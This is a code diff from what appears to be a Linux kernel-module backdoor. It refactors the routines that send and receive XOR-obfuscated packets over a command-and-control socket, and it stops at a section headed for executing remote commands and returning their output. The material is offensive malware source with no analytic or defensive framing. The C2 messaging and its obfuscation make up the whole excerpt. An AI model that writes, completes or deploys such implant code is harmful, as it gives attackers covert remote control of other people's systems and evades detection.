@@ -72,69 +72,67 @@ static int sock_recv(struct socket *sock, void *buf, size_t len)
 
 /* ─── Send a packet ─── */
 
-static int send_packet(uint8_t opcode, const char *payload, uint32_t payload_len)
+static int send_packet(uint8_t opcode, const char *payload, uint32_t len)
 {
-    if (!c2_sock || !connected)
+    struct packet_hdr hdr;
+    
+    if (!c2_sock)
         return -1;
 
-    struct packet_hdr hdr;
     hdr.opcode = opcode;
-    hdr.length = cpu_to_be32(payload_len);
+    hdr.length = htonl(len);
 
-    char *enc = NULL;
-    if (payload_len > 0) {
-        enc = kmemdup(payload, payload_len, GFP_KERNEL);
-        if (!enc)
-            return -ENOMEM;
-        xor_crypt(enc, payload_len);
-    }
+    if (sock_send(c2_sock, &hdr, sizeof(hdr)) < 0)
+        return -1;
 
-    int ret = sock_send(c2_sock, &hdr, sizeof(hdr));
-    if (ret < 0)
-        goto out;
+    if (len == 0 || !payload)
+        return 0;
 
-    if (enc && payload_len > 0)
-        ret = sock_send(c2_sock, enc, payload_len);
+    char *enc = kmalloc(len, GFP_KERNEL);
+    if (!enc)
+        return -1;
 
-out:
+    memcpy(enc, payload, len);
+    xor_crypt(enc, len);
+
+    int ret = sock_send(c2_sock, enc, len);
     kfree(enc);
     return ret;
 }
 
-/* ─── Receive a packet ─── */
-
-static int recv_packet(uint8_t *opcode, char **payload, uint32_t *payload_len)
+static int recv_packet(uint8_t *opcode, char **payload, uint32_t *len)
 {
     struct packet_hdr hdr;
-    int ret;
+    
+    if (!c2_sock)
+        return -1;
 
-    ret = sock_recv(c2_sock, &hdr, sizeof(hdr));
-    if (ret <= 0)
-        return ret;
+    if (sock_recv(c2_sock, &hdr, sizeof(hdr)) < 0)
+        return -1;
 
-    *opcode      = hdr.opcode;
-    *payload_len = be32_to_cpu(hdr.length);
+    *opcode = hdr.opcode;
+    *len    = ntohl(hdr.length);
 
-    if (*payload_len == 0) {
+    if (*len == 0) {
         *payload = NULL;
-        return ret;
+        return 0;
     }
 
-    *payload = kmalloc(*payload_len + 1, GFP_KERNEL);
+    *payload = kmalloc(*len + 1, GFP_KERNEL);
     if (!*payload)
-        return -ENOMEM;
+        return -1;
 
-    ret = sock_recv(c2_sock, *payload, *payload_len);
-    if (ret <= 0) {
+    if (sock_recv(c2_sock, *payload, *len) < 0) {
         kfree(*payload);
         *payload = NULL;
-        return ret;
+        return -1;
     }
 
-    (*payload)[*payload_len] = '\0';
-    xor_crypt(*payload, *payload_len);
-    return ret;
+    (*payload)[*len] = '\0';
+    xor_crypt(*payload, *len);
+    return 0;
 }
+
 
 /* ─── Execute a command and return output ─── */
 
